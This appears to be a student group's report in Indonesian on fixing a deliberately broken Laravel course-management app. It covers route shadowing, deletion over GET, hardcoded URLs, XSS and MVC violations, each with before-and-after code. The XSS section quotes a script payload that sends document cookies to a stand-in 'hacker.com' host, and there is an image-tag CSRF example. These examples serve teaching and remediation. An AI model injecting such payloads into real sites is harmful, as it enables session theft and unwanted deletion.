@@ -1,0 +1,175 @@
+# Laporan Perbaikan LMS-Broken (Minggu 02 - Branch W02)
+Kelompok 07 — Pemrograman Web
+
+---
+
+## Ringkasan 6 Temuan Masalah & Perbaikannya
+
+---
+
+### Temuan ke-1: Urutan Route Saling Menutupi (Route Shadowing)
+
+**Konsep.** Laravel membaca `routes/web.php` dari atas ke bawah dan mengeksekusi route pertama yang cocok dengan pola URL.
+
+**Masalah.** Di `routes/web.php`, route `/courses/{id}` berada di atas route `/courses/create`. Saat pengguna membuka `/courses/create`, Laravel membaca "create" sebagai nilai `{id}`. ID itu tidak ada di data, jadi controller melempar 404 dan halaman form tambah data tidak pernah muncul.
+
+**Sebelum:**
+```php
+Route::get('/courses/{id}', [CourseController::class, 'show'])->name('courses.show');
+Route::get('/courses/create', [CourseController::class, 'create'])->name('courses.create');
+```
+
+**Sesudah:**
+```php
+Route::get('/courses/create', [CourseController::class, 'create'])->name('courses.create');
+Route::get('/courses/{id}', [CourseController::class, 'show'])->name('courses.show');
+```
+
+**Perbaikan.** Route statis (`/courses/create`) harus berada di atas route dengan parameter dinamis (`/courses/{id}`), supaya Laravel mencocokkan URL create dulu sebelum menganggapnya ID.
+
+---
+
+### Temuan ke-2: Method Hapus Data Menggunakan HTTP GET
+
+**Konsep.** HTTP `GET` hanya untuk mengambil data — safe dan idempotent. `DELETE` menangani penghapusan.
+
+**Masalah.** Route hapus terdaftar sebagai `Route::get('/courses/{id}/delete')`, dan view memanggilnya lewat `<a href="...">`. Dua risiko muncul dari sini. Googlebot atau browser pre-fetching mengunjungi semua link `<a>` secara otomatis, sehingga bisa menghapus data tanpa ada yang mengklik apa pun. Penyerang juga bisa menyisipkan `<img src="http://web-kita/courses/1/delete">` di situs lain — begitu korban membuka halaman itu, datanya terhapus.
+
+**Sebelum (`routes/web.php`):**
+```php
+Route::get('/courses/{id}/delete', [CourseController::class, 'destroy'])->name('courses.destroy.broken');
+```
+
+**Sebelum (`resources/views/courses/index.blade.php`):**
+```blade
+<a href="/courses/{{ $course['id'] }}/delete" class="text-red-600 hover:underline" onclick="return confirm('Hapus?')">Hapus</a>
+```
+
+**Sesudah:**
+```php
+// routes/web.php
+Route::delete('/courses/{id}', [CourseController::class, 'destroy'])->name('courses.destroy');
+```
+
+```blade
+{{-- resources/views/courses/index.blade.php --}}
+<form action="{{ route('courses.destroy', $course['id']) }}" method="POST" class="inline" onsubmit="return confirm('Hapus?')">
+    @csrf
+    @method('DELETE')
+    <button type="submit" class="text-red-600 hover:underline bg-transparent border-0 p-0 cursor-pointer">Hapus</button>
+</form>
+```
+
+**Fungsi metode.** `Route::delete` membatasi route agar hanya menerima request DELETE. `@csrf` menghasilkan token yang membuktikan request penghapusan datang dari form resmi situs kita, bukan dari sumber luar. `@method('DELETE')` melakukan HTTP Method Spoofing: karena form HTML native hanya mendukung GET dan POST, direktif ini memberi tahu Laravel untuk memperlakukan POST tersebut sebagai DELETE.
+
+---
+
+### Temuan ke-3: Hardcoded URL pada View Index
+
+**Konsep.** Laravel punya named routes dan helper `route('nama.route')`, supaya link tidak bergantung pada string URL mentah.
+
+**Masalah.** Di `resources/views/courses/index.blade.php`, tautan detail ditulis manual: `<a href="/courses/{{ $course['id'] }}">`. Kalau URL ini berubah suatu saat — misalnya jadi `/mata-kuliah/{id}` — setiap tautan yang ditulis manual di semua file Blade akan rusak, dan harus diganti satu per satu.
+
+**Sebelum:**
+```blade
+<a href="/courses/{{ $course['id'] }}" class="text-blue-600 font-semibold hover:underline">
+    {{ $course['name'] }}
+</a>
+```
+
+**Sesudah:**
+```blade
+<a href="{{ route('courses.show', $course['id']) }}" class="text-blue-600 font-semibold hover:underline">
+    {{ $course['name'] }}
+</a>
+```
+
+**Perbaikan.** `route('courses.show', $course['id'])` membangun URL berdasarkan konfigurasi di `routes/web.php`. Ubah path di satu tempat, dan semua link ikut ter-update.
+
+---
+
+### Temuan ke-4: Hardcoded URL pada Navbar Komponen Layout
+
+**Konsep.** `<x-layout>` jadi kerangka utama semua halaman, termasuk navbar.
+
+**Masalah.** Navbar di `resources/views/components/layout.blade.php` ditulis langsung sebagai `<a href="/courses">`. Kalau aplikasi ini dipasang di subdirektori, misalnya `http://localhost/projekku/public/`, link `/courses` mengarah ke root domain (`http://localhost/courses`) dan menghasilkan 404.
+
+**Sebelum:**
+```blade
+<a href="/courses" class="hover:underline">Mata Kuliah</a>
+```
+
+**Sesudah:**
+```blade
+<a href="{{ route('courses.index') }}" class="hover:underline">Mata Kuliah</a>
+```
+
+**Perbaikan.** `{{ route('courses.index') }}` membangun URL dari domain dan path tempat aplikasi berjalan, jadi navbar tetap benar di subdirektori mana pun.
+
+---
+
+### Temuan ke-5: Kerentanan XSS (Cross-Site Scripting)
+
+**Konsep.** Blade punya dua cara mencetak variabel. `{{ $data }}` menjalankan `htmlspecialchars()` dan mengubah karakter seperti `<` dan `>` jadi teks biasa. `{!! $data !!}` mencetak HTML mentah tanpa filter.
+
+**Masalah.** Di `resources/views/courses/show.blade.php`, deskripsi mata kuliah dicetak lewat `{!! $course['description'] !!}`. Kalau ada pengguna yang mengisi deskripsi dengan script seperti `<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>`, script itu langsung jalan di browser siapa pun yang membuka halaman.
+
+**Sebelum:**
+```blade
+<div class="prose">
+    {!! $course['description'] !!}
+</div>
+```
+
+**Sesudah:**
+```blade
+<div class="prose">
+    {{ $course['description'] }}
+</div>
+```
+
+**Perbaikan.** Mengganti ke `{{ $course['description'] }}` menetralkan tag HTML dan script jadi teks biasa, sehingga halaman tidak lagi rentan XSS.
+
+---
+
+### Temuan ke-6: Logika Filter Ditaruh di View (Pelanggaran MVC)
+
+**Konsep.** Di MVC, controller memproses data dan logika bisnis; view hanya menampilkan data yang sudah siap.
+
+**Masalah.** `resources/views/courses/index.blade.php` menyimpan blok `@php $activeCourses = array_filter(...) @endphp` langsung di dalam view. Ini membuat kode Blade sulit diuji dan melanggar separation of concerns.
+
+**Sebelum (`resources/views/courses/index.blade.php`):**
+```blade
+@php
+    $activeCourses = array_filter($courses, function($c) {
+        return $c['status'] === 'active';
+    });
+@endphp
+
+<table ...>
+    @foreach ($activeCourses as $course)
+    ...
+```
+
+**Sesudah (`app/Http/Controllers/CourseController.php`):**
+```php
+public function index()
+{
+    // Logika pemfilteran dipindahkan ke Controller
+    $courses = array_filter($this->courses, function ($course) {
+        return $course['status'] === 'active';
+    });
+
+    return view('courses.index', compact('courses'));
+}
+```
+
+**Sesudah (`resources/views/courses/index.blade.php`):**
+```blade
+{{-- Blok @php dihapus total, view langsung melakukan looping data --}}
+<table ...>
+    @foreach ($courses as $course)
+    ...
+```
+
+**Perbaikan.** Filter status `active` pindah ke `CourseController::index()`. View menerima array `$courses` yang sudah siap tampil, tanpa logika PHP tercampur di dalamnya.
